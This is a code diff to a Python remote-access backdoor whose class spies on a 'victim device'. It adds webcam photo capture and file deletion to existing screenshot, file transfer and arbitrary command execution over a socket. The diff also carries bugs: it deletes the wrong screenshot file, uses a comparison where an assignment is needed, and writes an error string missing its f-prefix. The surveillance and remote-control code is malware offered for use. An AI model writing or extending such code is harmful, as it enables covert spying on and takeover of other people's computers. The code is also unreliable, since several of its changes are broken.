@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket, subprocess, json, os, base64, shutil, sys, mss
+import socket, subprocess, json, os, base64, shutil, sys, mss, cv2
 
 class Backdoor:
     # Backdoor class
@@ -64,15 +64,33 @@ class Backdoor:
             file.write(base64.b64decode(file_data))
             return '[+] Upload successful.'
     
+    def delete_file(self, file_path):
+        # Deleting selected file
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
     def screenshot(self):
         # Screenshot whole screens of victim device
         with mss.mss() as scr:
             scr.shot(mon = -1, output = 'screen.png')
             data = self.read_file('screen.png')
-            if os.path.exists('screen.png'):
-                os.remove('screen.png')
+            self.delete_file('screen.jpg')
             return data
 
+    def photo(self):
+        # Taking photo from camera of victim device
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            return '[-] Error: can\'t access to camera.'
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite('photo.jpg', frame)
+        cap.release()
+        cv2.destroyAllWindows()
+
+        data = self.read_file('photo.jpg')
+        self.delete_file('photo.jpg')
+        return data
 
     def run(self):
         # Method which run everythong - receiving, sending, executing, etc.
@@ -90,10 +108,12 @@ class Backdoor:
                     command_result = self.write_file(command[1], command[2])
                 elif command[0] == 'screenshot':
                     command_result = self.screenshot()
+                elif command[0] == 'photo':
+                    command_result == self.photo()
                 else:
                     command_result = self.execute_system_command(command)
-            except Exception:
-                command_result = '[-] Error occured when executing command.'
+            except Exception as e:
+                command_result = '[-] Error: {e}'
             
             self.reliable_send(command_result)
 
